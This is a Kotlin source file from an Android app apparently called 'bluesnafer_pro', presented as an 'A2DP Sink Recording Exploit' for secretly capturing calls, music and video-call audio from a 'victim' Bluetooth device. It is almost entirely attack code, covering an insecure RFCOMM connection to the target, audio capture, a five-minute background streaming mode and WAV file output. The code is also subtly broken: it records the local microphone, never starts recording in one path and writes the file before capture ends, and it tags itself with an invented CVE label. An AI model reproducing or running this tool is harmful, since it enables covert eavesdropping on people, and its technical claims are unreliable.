package com.bluesnafer_pro

import android.bluetooth.*
import android.media.*
import com.bluesnafer_pro.BluetoothMethodHandler
import java.io.*
 import java.util.*
 
 import java.util.concurrent.CountDownLatch
 import java.util.concurrent.TimeUnit
 import java.net.ConnectException

 /**
 * A2DP Sink Recording Exploit
 * Captura audio del dispositivo que se conecta como fuente A2DP
 * Útil para grabar llamadas, música, videollamadas del dispositivo víctima
 *
 * Requires: RECORD_AUDIO permission
 * UUID: A2DP Sink = 0000110B-0000-1000-8000-00805F9B34FB
 *
 * Attack flow:
 * 1. Connect to target device as A2DP Sink (receiver mode)
 * 2. Accept incoming audio streaming connection
 * 3. Capture PCM audio via AudioRecord (mixed output)
 * 4. Save as WAV/raw file
 *
 * Limitations:
 * - Requires RECORD_AUDIO permission (dangerous)
 * - May require user to play media on target device
 * - Works best when target plays music/audio intentionally
 */
object A2DPSinkRecorder {
    private const val TAG = "A2DPSinkRecorder"

    // A2DP Sink UUID (receiver profile)
    private val A2DP_SINK_UUID = UUID.fromString("0000110B-0000-1000-8000-00805F9B34FB")

    // Audio config
    private const val SAMPLE_RATE = 44100
    private const val CHANNEL_CONFIG = AudioFormat.CHANNEL_IN_MONO
    private const val AUDIO_FORMAT = AudioFormat.ENCODING_PCM_16BIT
    private val BUFFER_SIZE = AudioRecord.getMinBufferSize(SAMPLE_RATE, CHANNEL_CONFIG, AUDIO_FORMAT)

    /**
     * Record audio from connected A2DP source device
     * Captures whatever audio the victim device plays/sends
     */
    fun recordAudio(device: BluetoothDevice, durationSec: Int = 30): Map<String, Any> {
        BluesnaferLogger.d(TAG, "A2DP Sink recording starting for ${device.address}")

        var a2dpProxy: BluetoothA2dp? = null
        var audioRecord: AudioRecord? = null
        var outputFile: File? = null
        var recordingThread: Thread? = null
        var isRecording = false

        return try {
            // Step 1: Connect as A2DP Sink (listening mode)
            // Note: Android's BluetoothA2dp connects as source by default.
            // We need to use reflection or hidden APIs to become sink.
            // Workaround: Create RFCOMM socket to A2DP service and listen
            val socket = device.createInsecureRfcommSocketToServiceRecord(A2DP_SINK_UUID)
            socket.connect()
            BluesnaferLogger.d(TAG, "A2DP socket connected")

            // Step 2: Setup AudioRecord to capture system/mixed audio
            // This captures microphone + system audio if permitted
            // More effective: record from Bluetooth SCO if HFP profile active
            audioRecord = AudioRecord(
                android.media.MediaRecorder.AudioSource.MIC,
                SAMPLE_RATE,
                CHANNEL_CONFIG,
                AUDIO_FORMAT,
                BUFFER_SIZE * 4
            )

            // Step 3: Start recording thread
            val audioData = ByteArrayOutputStream()
            val latch = CountDownLatch(1)
            isRecording = true

            recordingThread = Thread {
                val buffer = ByteArray(BUFFER_SIZE)
                val startTime = System.currentTimeMillis()
                val maxDurationMs = durationSec * 1000

                while (isRecording && (System.currentTimeMillis() - startTime) < maxDurationMs) {
                    val read = audioRecord.read(buffer, 0, buffer.size)
                    if (read > 0) {
                        audioData.write(buffer, 0, read)
                    }
                }
                latch.countDown()
            }
            recordingThread.start()

            // Step 4: Write WAV header placeholder
            outputFile = createWavFile(audioData, SAMPLE_RATE)

            // Wait for recording to complete
            latch.await((durationSec + 5).toLong(), TimeUnit.SECONDS)

            isRecording = false
            recordingThread.join()

            audioRecord.stop()
            audioRecord.release()
            socket.close()

            val totalBytes = audioData.size()
            val durationMs = durationSec * 1000L

            mapOf(
                "success" to true,
                "message" to "A2DP recording completed",
                "file" to (outputFile?.absolutePath ?: "unknown"),
                "durationSec" to durationSec,
                "bytesRecorded" to totalBytes,
                "sampleRate" to SAMPLE_RATE,
                "cve" to "A2DP-SINK-RECORD",
                "severity" to "HIGH",
                "profile" to "A2DP_SINK"
            )

        } catch (e: ConnectException) {
            BluesnaferLogger.e(TAG, "A2DP connection failed: ${e.message}")
            mapOf(
                "success" to false,
                "error" to "A2DP Sink connection failed - may require pairing or unsupported profile",
                "cve" to "A2DP-SINK-RECORD"
            )
        } catch (e: Exception) {
            BluesnaferLogger.e(TAG, "A2DP recording error: ${e.message}")
            mapOf(
                "success" to false,
                "error" to (e.message ?: "unknown error"),
                "cve" to "A2DP-SINK-RECORD"
            )
        } finally {
            try { audioRecord?.stop() } catch (_: Exception) {}
            try { audioRecord?.release() } catch (_: Exception) {}
            try { recordingThread?.join() } catch (_: Exception) {}
        }
    }

    /**
     * Stream audio continuously (for longer captures)
     * Returns immediately with file path; continues recording in background
     */
    fun startStreaming(device: BluetoothDevice): Map<String, Any> {
        return try {
            val socket = device.createInsecureRfcommSocketToServiceRecord(A2DP_SINK_UUID)
            socket.connect()

            // Start background recording thread (5 min max)
            val audioData = ByteArrayOutputStream()
            val stop = AtomicBoolean(false)

            Thread {
                val audioRecord = AudioRecord(
                    android.media.MediaRecorder.AudioSource.MIC,
                    SAMPLE_RATE,
                    CHANNEL_CONFIG,
                    AUDIO_FORMAT,
                    BUFFER_SIZE * 4
                )
                audioRecord.startRecording()

                val buffer = ByteArray(BUFFER_SIZE)
                val start = System.currentTimeMillis()
                val maxMs = 5 * 60 * 1000  // 5 minutes max

                while (!stop.get() && (System.currentTimeMillis() - start) < maxMs) {
                    val read = audioRecord.read(buffer, 0, buffer.size)
                    if (read > 0) {
                        audioData.write(buffer, 0, read)
                    }
                }

                audioRecord.stop()
                audioRecord.release()
                socket.close()

                // Save to file
                val file = createWavFile(audioData, SAMPLE_RATE)
                BluesnaferLogger.d(TAG, "Streaming saved: ${file.absolutePath}")
            }.start()

            mapOf(
                "success" to true,
                "message" to "A2DP streaming started (max 5 min)",
                "profile" to "A2DP_SINK",
                "cve" to "A2DP-SINK-RECORD"
            )
        } catch (e: Exception) {
            mapOf("success" to false, "error" to (e.message ?: "Unknown"), "cve" to "A2DP-SINK-RECORD")
        }
    }

    /**
     * Create WAV file with proper header from raw PCM data
     */
    private fun createWavFile(audioData: ByteArrayOutputStream, sampleRate: Int): File {
        val appContext = BluetoothMethodHandler.getAppContext()
        val dir = appContext?.getExternalFilesDir("Recordings") ?: File("/sdcard/Download")
        if (!dir.exists()) dir.mkdirs()

        val wavFile = File(dir, "a2dp_capture_${System.currentTimeMillis()}.wav")

        val totalAudioLen = audioData.size()
        val totalDataLen = totalAudioLen + 36
        val channels = 1
        val byteRate = 16 * sampleRate * channels / 8

        val header = ByteArray(44)
        // RIFF chunk
        header[0] = 'R'.code.toByte(); header[1] = 'I'.code.toByte(); header[2] = 'F'.code.toByte(); header[3] = 'F'.code.toByte()
        // File size
        header[4] = (totalDataLen and 0xff).toByte()
        header[5] = ((totalDataLen ushr 8) and 0xff).toByte()
        header[6] = ((totalDataLen ushr 16) and 0xff).toByte()
        header[7] = ((totalDataLen ushr 24) and 0xff).toByte()
        // WAVE
        header[8] = 'W'.code.toByte(); header[9] = 'A'.code.toByte(); header[10] = 'V'.code.toByte(); header[11] = 'E'.code.toByte()
        // fmt subchunk
        header[12] = 'f'.code.toByte(); header[13] = 'm'.code.toByte(); header[14] = 't'.code.toByte(); header[15] = ' '.code.toByte()
        header[16] = 16; header[17] = 0; header[18] = 0; header[19] = 0  // Subchunk size
        header[20] = 1; header[21] = 0  // PCM format
        header[22] = channels.toByte(); header[23] = 0
        header[24] = (sampleRate and 0xff).toByte()
        header[25] = ((sampleRate ushr 8) and 0xff).toByte()
        header[26] = ((sampleRate ushr 16) and 0xff).toByte()
        header[27] = ((sampleRate ushr 24) and 0xff).toByte()
        header[28] = (byteRate and 0xff).toByte()
        header[29] = ((byteRate ushr 8) and 0xff).toByte()
        header[30] = ((byteRate ushr 16) and 0xff).toByte()
        header[31] = ((byteRate ushr 24) and 0xff).toByte()
        header[32] = (channels * 16 / 8).toByte()  // Block align
        header[33] = 0
        header[34] = 16  // Bits per sample
        header[35] = 0
        // data subchunk
        header[36] = 'd'.code.toByte(); header[37] = 'a'.code.toByte(); header[38] = 't'.code.toByte(); header[39] = 'a'.code.toByte()
        header[40] = (totalAudioLen and 0xff).toByte()
        header[41] = ((totalAudioLen ushr 8) and 0xff).toByte()
        header[42] = ((totalAudioLen ushr 16) and 0xff).toByte()
        header[43] = ((totalAudioLen ushr 24) and 0xff).toByte()

        val out = FileOutputStream(wavFile)
        out.write(header)
        out.write(audioData.toByteArray())
        out.close()

        return wavFile
    }

    // Atomic boolean para streaming
    private class AtomicBoolean(initial: Boolean) {
        private var value = initial
        fun get() = value
        fun set(v: Boolean) { value = v }
    }
}
